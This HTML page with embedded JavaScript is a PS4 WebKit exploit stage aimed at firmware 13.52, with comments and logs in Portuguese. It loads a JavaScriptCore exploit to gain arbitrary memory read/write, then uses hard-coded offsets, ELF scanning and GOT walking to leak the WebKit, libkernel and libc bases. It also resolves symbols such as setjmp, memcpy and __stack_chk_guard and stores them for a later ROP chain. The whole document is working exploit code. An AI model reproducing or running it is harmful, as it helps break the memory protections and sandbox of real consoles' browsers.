<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 WebKit Exploit</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0f; color: #e0e0e0;
               font-family: 'Courier New', monospace;
               min-height: 100vh; display: flex;
               flex-direction: column; align-items: center; padding: 20px; }
        h1 { font-size: 18px; color: #00c8ff; letter-spacing: 4px;
             text-transform: uppercase; margin-bottom: 6px; text-align: center; }
        #fw-label { font-size: 11px; color: #666; margin-bottom: 18px;
                    text-align: center; letter-spacing: 2px; }
        #status-bar { width: 100%; max-width: 700px; background: #111118;
            border: 1px solid #1e1e2e; border-radius: 6px;
            padding: 12px 16px; margin-bottom: 12px;
            display: flex; align-items: center; gap: 10px; }
        #status-dot { width: 10px; height: 10px; border-radius: 50%;
            background: #444; flex-shrink: 0; transition: background 0.3s; }
        #status-dot.running { background: #f0a500; animation: pulse 1s infinite; }
        #status-dot.ok      { background: #00c853; }
        #status-dot.error   { background: #ff3d3d; }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
        #status-text { font-size: 13px; color: #ccc; flex: 1; }
        #attempt-bar { width: 100%; max-width: 700px; display: flex;
            justify-content: space-between; font-size: 11px; color: #444;
            margin-bottom: 12px; padding: 0 2px; }
        #console { width: 100%; max-width: 700px; height: 420px;
            background: #06060c; border: 1px solid #1a1a2e; border-radius: 6px;
            overflow-y: auto; padding: 10px 12px; font-size: 12px;
            line-height: 1.6; margin-bottom: 12px; }
        .log-line  { padding: 1px 0; word-break: break-all; }
        .log-info  { color: #7ec8e3; }
        .log-ok    { color: #00c853; font-weight: bold; }
        .log-warn  { color: #f0a500; }
        .log-error { color: #ff5252; font-weight: bold; }
        .log-dim   { color: #555; }
        .log-addr  { color: #bd93f9; }
        .log-section { color: #00c8ff; border-top: 1px solid #1a1a2e;
                       margin-top: 6px; padding-top: 6px; letter-spacing: 1px; }
        #bases-grid { width: 100%; max-width: 700px; display: none;
            grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
        #bases-grid.visible { display: grid; }
        .base-card { background: #0d0d1a; border: 1px solid #1e1e3a;
                     border-radius: 6px; padding: 10px 14px; }
        .base-card .label { font-size: 10px; color: #555;
            text-transform: uppercase; letter-spacing: 2px; margin-bottom: 4px; }
        .base-card .value { font-size: 13px; color: #bd93f9; word-break: break-all; }
        .base-card .value.na { color: #333; }
        #libs-list { width: 100%; max-width: 700px; display: none;
            flex-direction: column; gap: 6px; margin-bottom: 12px; }
        #libs-list.visible { display: flex; }
        .lib-row { background: #0d0d1a; border: 1px solid #1a1a2e;
            border-radius: 4px; padding: 8px 12px;
            display: flex; justify-content: space-between; font-size: 12px; }
        .lib-row .lib-name { color: #8be9fd; }
        .lib-row .lib-base { color: #bd93f9; }
    </style>
</head>
<body>

<h1>PS4 WebKit Exploit</h1>
<div id="fw-label">aguardando firmware...</div>
<div id="status-bar">
    <div id="status-dot"></div>
    <div id="status-text">Inicializando...</div>
</div>
<div id="attempt-bar">
    <span id="attempt-text">tentativa: —</span>
    <span id="stage-text">estágio: —</span>
</div>
<div id="console"></div>
<div id="bases-grid">
    <div class="base-card"><div class="label">WebKit Base</div>
        <div class="value na" id="card-webkit">—</div></div>
    <div class="base-card"><div class="label">libkernel Base</div>
        <div class="value na" id="card-kernel">—</div></div>
    <div class="base-card"><div class="label">libc Base</div>
        <div class="value na" id="card-libc">—</div></div>
    <div class="base-card"><div class="label">Método</div>
        <div class="value na" id="card-method">—</div></div>
</div>
<div id="libs-list"></div>

<script type="module">

import { int64 }              from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP }     from './resources/mem.js';

// Offsets do firmware 13.52 confirmados por 2 runs independentes
// Run1: 0x8036F9E20 - 0x036F9E20 = 0x800000000 ✅
// Run2: 0x81CBF9E20 - 0x036F9E20 = 0x819500000 ✅
const OFFSET_wk_host_constructor_candidates = [0x036F9E20];
const WK_ASLR_LOW  = 0x800000000;
const WK_ASLR_HIGH = 0x900000000;
const WK_BASE_ALIGN = 0x4000;

globalThis.int64 = int64;

// ── UI ─────────────────────────────────────────────────────────────────────
const $con      = document.getElementById('console');
const $dot      = document.getElementById('status-dot');
const $stTxt    = document.getElementById('status-text');
const $attTxt   = document.getElementById('attempt-text');
const $stageTxt = document.getElementById('stage-text');
const $fwLbl    = document.getElementById('fw-label');
const $grid     = document.getElementById('bases-grid');
const $libs     = document.getElementById('libs-list');

function log(msg, cls = 'log-info') {
    const el = document.createElement('div');
    el.className = 'log-line ' + cls;
    el.textContent = msg;
    $con.appendChild(el);
    $con.scrollTop = $con.scrollHeight;
}
function setStatus(msg, st = 'running') { $stTxt.textContent = msg; $dot.className = st; }
function setCard(id, v)  { const e = document.getElementById(id); if (e) { e.textContent = v; e.classList.remove('na'); } }
function addLibRow(name, base) {
    const row = document.createElement('div');
    row.className = 'lib-row';
    row.innerHTML = `<span class="lib-name">${name}</span><span class="lib-base">0x${base}</span>`;
    $libs.appendChild(row); $libs.classList.add('visible');
}
function tick() { return new Promise(r => setTimeout(r, 0)); }

// ── firmware ────────────────────────────────────────────────────────────────
const ua    = navigator.userAgent;
const fwM   = /PlayStation (?:4|5)\/(\d+\.\d+)/.exec(ua);
const fwStr = fwM ? fwM[1] : '';
$fwLbl.textContent = fwStr ? `PlayStation — firmware ${fwStr}` : ua.slice(0, 80);

function readStr(p, addr, max = 128) {
    let s = '';
    for (let i = 0; i < max; i++) { const c = p.read1(addr.add32(i)); if (!c) break; s += String.fromCharCode(c); }
    return s;
}

// ── FASE 1: /proc/self/maps ─────────────────────────────────────────────────
async function tryMaps() {
    for (const u of ['file:///proc/self/maps', 'file:///proc/self/smaps']) {
        try { const r = await fetch(u); const t = await r.text();
              if (t.length > 50) { log('[+] /proc/self/maps ok!', 'log-ok'); log(t.slice(0, 3000), 'log-dim'); return t; }
        } catch (_) {}
    }
    log('[-] /proc/self/maps: sandbox ativo', 'log-warn');
    return null;
}

// ── FASE 2: base WebKit — método rápido (offset fixo confirmado) ─────────────
//
// Igual ao que o slopkit faz no PS5, mas adaptado para o PS4:
//   base = __ps5NativeCtor − OFFSET_fixo
//   Validação: base no range ASLR E alinhada a WK_BASE_ALIGN
//
// Tempo: ~3 leituras de memória (instantâneo), sem ELF scan.
// O offset foi determinado por ELF scan em 2 runs anteriores
// e é constante para o firmware 13.52.
//
function resolveWebKitBaseFast(ctorRaw) {
    log('[*] Método rápido: subtração de offset fixo (FW 13.52)', 'log-dim');

    for (const hc of OFFSET_wk_host_constructor_candidates) {
        // ctorRaw é um number JS (pode perder precisão acima de 2^53)
        // Para o range 0x800000000-0x900000000 está dentro de Number.MAX_SAFE_INTEGER
        const wb = ctorRaw - hc;

        const aligned = wb % WK_BASE_ALIGN === 0;
        const inRange = wb >= WK_ASLR_LOW && wb < WK_ASLR_HIGH;

        log(`  candidato: ctor(0x${ctorRaw.toString(16)}) - 0x${hc.toString(16)} = 0x${wb.toString(16)}`, 'log-dim');
        log(`  aligned(0x${WK_BASE_ALIGN.toString(16)}): ${aligned ? '✅' : '❌'}  in_range: ${inRange ? '✅' : '❌'}`, 'log-dim');

        if (aligned && inRange) {
            const lo = (wb % 0x100000000) >>> 0;
            const hi = Math.floor(wb / 0x100000000) >>> 0;
            const base = new int64(lo, hi);
            log(`[+] WebKit base (offset fixo): 0x${base.toString()}`, 'log-ok');
            setCard('card-method', 'offset fixo (instantâneo)');
            return base;
        }
    }
    return null;
}

// ── FASE 2 fallback: ELF scan em 2 estágios ─────────────────────────────────
// Usado se o offset fixo falhar (firmware diferente ou base fora do range).
// Stage1: passo 2MB (~500 leituras para cobrir 1GB)
// Stage2: passo 4KB para precisão exata dentro do bloco de 2MB
async function findElfBase(p, anchor, label) {
    const FLOOR       = new int64(0x00000000, 0x00000008);
    const STEP_COARSE = 0x200000;
    const STEP_FINE   = 0x1000;

    let cur = new int64((anchor.low & ~(STEP_COARSE - 1)) >>> 0, anchor.hi);
    log(`[*] ELF scan (${label}) passo 2MB a partir de 0x${anchor.toString()}`, 'log-dim');
    setCard('card-method', 'ELF scan (fallback)');

    let hit = null; let itr = 0;
    while (cur.hi > FLOOR.hi || (cur.hi === FLOOR.hi && cur.low >= FLOOR.low)) {
        if (++itr % 32 === 0) {
            const mb = Math.round(((anchor.hi - cur.hi) * 0x100000000 + (anchor.low - cur.low)) / 1024 / 1024);
            setStatus(`Scan ${label}: −${mb} MB…`, 'running');
            await tick();
        }
        let magic = 0;
        try { magic = p.read4(cur); } catch (_) { cur = cur.sub32(STEP_COARSE); continue; }
        if (magic === 0x464C457F) {
            try { if (p.read1(cur.add32(4)) === 2 && p.read1(cur.add32(5)) === 1) { hit = cur; break; } } catch (_) {}
        }
        cur = cur.sub32(STEP_COARSE);
    }
    if (!hit) { log(`[-] Stage1 não achou ${label}`, 'log-warn'); return null; }

    log(`[~] Região encontrada (stage1): 0x${hit.toString()}`, 'log-warn');
    let fine = new int64(hit.low >>> 0, hit.hi);
    const ceil_lo = (hit.low + STEP_COARSE) >>> 0;
    const ceil_hi = hit.hi + (ceil_lo < hit.low ? 1 : 0);
    while (fine.hi < ceil_hi || (fine.hi === ceil_hi && fine.low < ceil_lo)) {
        let magic = 0;
        try { magic = p.read4(fine); } catch (_) { fine = new int64((fine.low + STEP_FINE) >>> 0, fine.hi); continue; }
        if (magic === 0x464C457F) {
            try { if (p.read1(fine.add32(4)) === 2 && p.read1(fine.add32(5)) === 1)
                { log(`[+] ${label} base exata: 0x${fine.toString()}`, 'log-ok'); return fine; } } catch (_) {}
        }
        fine = new int64((fine.low + STEP_FINE) >>> 0, fine.hi);
    }
    log(`[~] ${label} base aproximada (±2MB): 0x${hit.toString()}`, 'log-warn');
    return hit;
}

// ── âncora para o ELF scan (fallback) ────────────────────────────────────────
function getVtableAnchor(p) {
    const raw = globalThis.__ps5NativeCtor;
    if (typeof raw === 'number' && raw > 0x100000000) {
        const hi = Math.floor(raw / 0x100000000);
        return new int64((raw - hi * 0x100000000) >>> 0, hi >>> 0);
    }
    // vtable da textarea como fallback do fallback
    try {
        const el = document.createElement('textarea');
        const vtable = p.read8(p.read8(p.leakval(el).add32(0x18)));
        let min = null;
        for (let i = 0; i < 64; i++) {
            let s; try { s = p.read8(vtable.add32(i * 8)); } catch (_) { break; }
            if (!s.hi || s.hi > 0xFFFF) continue;
            if (!min || s.hi < min.hi || (s.hi === min.hi && s.low < min.low)) min = s;
        }
        if (min) return min;
    } catch (_) {}
    return null;
}

// ── parse DYNAMIC ─────────────────────────────────────────────────────────────
function parseDynamic(p, base) {
    try {
        const phoff = p.read8(base.add32(0x20)).low, phentsz = p.read2(base.add32(0x36)), phnum = p.read2(base.add32(0x38));
        let dynOff = null, dynSz = 0;
        for (let i = 0; i < phnum; i++) { const ph = base.add32(phoff + i * phentsz); if (p.read4(ph) === 2) { dynOff = p.read8(ph.add32(0x08)).low; dynSz = p.read8(ph.add32(0x20)).low; break; } }
        if (dynOff === null) return null;
        const dyn = base.add32(dynOff);
        const r = { strtab:null, symtab:null, syment:0x18, pltgot:null, pltrelsz:0, sonameOff:0, soname:'' };
        for (let i = 0; i < Math.min(dynSz/0x10, 512); i++) {
            const e = dyn.add32(i*0x10), tag = p.read8(e).low, val = p.read8(e.add32(8));
            if (tag===0) break;
            if (tag===5)  r.strtab=val; if (tag===6)  r.symtab=val; if (tag===11) r.syment=val.low;
            if (tag===3)  r.pltgot=val; if (tag===2)  r.pltrelsz=val.low; if (tag===14) r.sonameOff=val.low;
        }
        if (r.strtab && r.sonameOff) try { r.soname = readStr(p, r.strtab.add32(r.sonameOff), 64); } catch(_){}
        return r;
    } catch (_) { return null; }
}

function findSymbol(p, base, dyn, name) {
    if (!dyn?.symtab || !dyn?.strtab) return null;
    for (let i = 0; i < 4096; i++) {
        try { const sym = dyn.symtab.add32(i * dyn.syment), sn = p.read4(sym); if (!sn) continue;
              if (readStr(p, dyn.strtab.add32(sn), 64) === name) return base.add32(p.read8(sym.add32(8)).low); }
        catch (_) {}
    }
    return null;
}

async function discoverImports(p, dyn) {
    if (!dyn?.pltgot) return [];
    const n = dyn.pltrelsz ? Math.floor(dyn.pltrelsz/0x18)+3 : 256;
    const seen = new Map();
    for (let i = 3; i < n; i++) {
        let slot; try { slot = p.read8(dyn.pltgot.add32(i*8)); } catch(_) { continue; }
        if (!slot.hi || slot.hi > 0xFFFF || slot.low & 3) continue;
        const libBase = await findElfBase(p, slot, `import[${i}]`);
        if (!libBase) continue;
        const key = libBase.toString();
        if (!seen.has(key)) {
            const d = parseDynamic(p, libBase), s = d?.soname || '<NID>';
            seen.set(key, { base:libBase, dyn:d, soname:s });
            log(`  → 0x${key}  ${s}`, 'log-addr');
            addLibRow(s, key);
        }
    }
    return [...seen.values()];
}

// ── LEAK PRINCIPAL ────────────────────────────────────────────────────────────
async function leakAllBases(p) {
    log('', '');
    log('-- FASE 1: /proc/self/maps --------------------', 'log-section');
    await tryMaps();

    log('', '');
    log('-- FASE 2: WebKit base ------------------------', 'log-section');

    let webkitBase = null;

    // Tenta o método rápido primeiro (offset fixo confirmado para 13.52)
    const ctorRaw = globalThis.__ps5NativeCtor;
    if (typeof ctorRaw === 'number' && ctorRaw > 0x100000000) {
        log(`  __ps5NativeCtor: 0x${ctorRaw.toString(16)}`, 'log-addr');
        webkitBase = resolveWebKitBaseFast(ctorRaw);
    } else {
        log('  __ps5NativeCtor não disponível', 'log-warn');
    }

    // Fallback: ELF scan de 2 estágios
    if (!webkitBase) {
        log('[!] Offset fixo falhou — usando ELF scan (fallback)', 'log-warn');
        log('    (Se o firmware mudou, o scan vai recalibrar o offset)', 'log-dim');
        const anchor = getVtableAnchor(p);
        if (!anchor) { setStatus('Falha: sem âncora para scan', 'error'); return null; }
        webkitBase = await findElfBase(p, anchor, 'WebKit');
        if (webkitBase) {
            // Calcula e mostra o offset para futura calibração
            const newOffset = ctorRaw - (webkitBase.hi * 0x100000000 + webkitBase.low);
            log(`  Novo offset calculado: 0x${newOffset.toString(16)}`, 'log-warn');
            log(`  → Atualize OFFSET_wk_host_constructor_candidates no index.html`, 'log-warn');
        }
    }

    if (!webkitBase) { setStatus('Falha: WebKit base não encontrada', 'error'); return null; }
    setCard('card-webkit', '0x' + webkitBase.toString());
    $grid.classList.add('visible');

    log('', '');
    log('-- FASE 3: parse DYNAMIC ----------------------', 'log-section');
    const wkDyn = parseDynamic(p, webkitBase);
    log(`  SONAME  : ${wkDyn?.soname || '<vazio>'}`, 'log-info');
    log(`  pltgot  : 0x${wkDyn?.pltgot?.toString() || '?'}`, 'log-dim');
    log(`  pltrelsz: ${wkDyn?.pltrelsz || 0}`, 'log-dim');

    log('', '');
    log('-- FASE 4: libs importadas via GOT ------------', 'log-section');
    const imports = await discoverImports(p, wkDyn);
    log(`  ${imports.length} módulo(s) encontrado(s)`, 'log-info');

    let lkEntry = null, lcEntry = null;
    for (const lib of imports) { const s = lib.soname.toLowerCase();
        if (!lkEntry && s.includes('kernel')) lkEntry = lib;
        if (!lcEntry && (s.includes('libc') || s.includes('libscelibcinternal'))) lcEntry = lib; }
    if (!lkEntry && imports.length) {
        const sorted = [...imports].sort((a,b) => a.base.hi!==b.base.hi?a.base.hi-b.base.hi:a.base.low-b.base.low);
        lkEntry = sorted[0]; log('[!] SONAME ilegível — menor base = libkernel', 'log-warn');
    }
    if (lkEntry) { setCard('card-kernel', '0x'+lkEntry.base.toString()); log('[+] libkernel: 0x'+lkEntry.base.toString(), 'log-ok'); }
    if (lcEntry) { setCard('card-libc', '0x'+lcEntry.base.toString()); log('[+] libc:      0x'+lcEntry.base.toString(), 'log-ok'); }

    log('', '');
    log('-- FASE 5: símbolos para ROP -----------------', 'log-section');
    const NEEDED = ['setjmp','longjmp','memset','memcpy','pthread_create','__stack_chk_guard','sceKernelGetProcParam'];
    const symbols = {};
    for (const sym of NEEDED) {
        for (const lib of imports) {
            const addr = findSymbol(p, lib.base, lib.dyn, sym);
            if (addr) { symbols[sym] = addr; log(`  [+] ${sym.padEnd(28)} 0x${addr.toString()}`, 'log-ok'); break; }
        }
    }

    const result = { webkitBase, libkernelBase:lkEntry?.base||null, libcBase:lcEntry?.base||null, allLibs:imports, symbols };
    log('', '');
    log('-- RESULTADO ----------------------------------', 'log-section');
    log(`webkitBase    = 0x${result.webkitBase.toString()}`, 'log-addr');
    log(`libkernelBase = 0x${result.libkernelBase?.toString()||'?'}`, 'log-addr');
    log(`libcBase      = 0x${result.libcBase?.toString()||'?'}`, 'log-addr');
    log('window._exploit pronto.', 'log-ok');
    globalThis._exploit = result;
    return result;
}

function onCoreEvent(tag, detail, attempt) {
    if (attempt !== undefined) $attTxt.textContent = `tentativa: ${attempt}`;
    $stageTxt.textContent = `estágio: ${tag.toLowerCase()}`;
    const QUIET = new Set(['PAIR-REPROVED','PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER','PAIR-COMMIT','PAIR-MAIN-RECORD','PAIR-CELLS','PAIR-WORKER-HEADER','PAIR-WIDENED','PAIR-RELEASE']);
    if (QUIET.has(tag)) { log(`  ${tag}: ${detail}`, 'log-dim'); return; }
    const isOk = /UP|OK|SUCCESS/.test(tag), isErr = /FAIL|ERR|GIVE/.test(tag);
    log(`[${tag}] ${detail}`, isOk?'log-ok':isErr?'log-error':'log-info');
}

(async () => {
    log(`UA: ${ua}`, 'log-dim');
    log(`Firmware: ${fwStr || 'desconhecido'}`, 'log-info');
    setStatus('Rodando exploit JSC (core.js)…', 'running');
    log('', '');
    log('-- EXPLOIT JSC ---------------------------------', 'log-section');

    let carrier;
    try {
        carrier = await establishPrimitive({ onEvent: onCoreEvent, maxAttempts: 0 });
    } catch (err) { setStatus('core.js falhou: ' + err.message, 'error'); log('[ERRO] '+err.message,'log-error'); return; }
    log('[+] exploit JSC ok — carrier pronto', 'log-ok');

    log('', '');
    log('-- INSTALANDO R/W (mem.js) --------------------', 'log-section');
    setStatus('Instalando primitiva…', 'running');
    let p;
    try {
        p = installWindowP(carrier, { promote:true, onEvent:(t,d)=>log(`  [mem/${t}] ${d}`,'log-dim') });
    } catch (err) { setStatus('mem.js falhou: '+err.message,'error'); log('[ERRO] '+err.message,'log-error'); return; }
    log('[+] R/W arbitrário: window.p instalado', 'log-ok');

    setStatus('Vazando bases…', 'running');
    try {
        const bases = await leakAllBases(p);
        if (!bases) { setStatus('Falha no leak de bases','error'); return; }
        setStatus('Bases vazadas ✓ — próximo: ROP chain', 'ok');
        log('Próximo: ROP chain com window._exploit', 'log-info');
    } catch (err) { setStatus('leakAllBases falhou: '+err.message,'error'); log('[ERRO] '+err.message,'log-error'); }
})();

</script>
